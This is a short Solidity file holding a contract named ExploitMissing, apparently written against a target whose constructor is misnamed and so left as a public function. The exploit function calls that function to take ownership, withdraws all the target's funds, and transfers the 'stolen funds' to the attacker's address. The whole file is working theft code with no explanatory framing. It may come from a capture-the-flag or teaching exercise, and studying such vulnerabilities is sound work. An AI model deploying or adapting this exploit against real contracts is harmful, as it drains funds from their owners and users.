pragma solidity ^0.4.24;

interface IMissing {
    function Constructor() external;
    function withdraw() external;
    function () external payable;
}

contract ExploitMissing {
    address public attacker;

    constructor() public {
        attacker = msg.sender;
    }

    function exploit(address target) public payable {
        IMissing missing = IMissing(target);

        // 1. Take ownership by calling misnamed constructor
        missing.Constructor();

        // 2. Withdraw all funds to this contract
        missing.withdraw();

        // 3. Forward stolen funds to attacker
        attacker.transfer(address(this).balance);
    }

    // Accept ether
    function () external payable {}
}

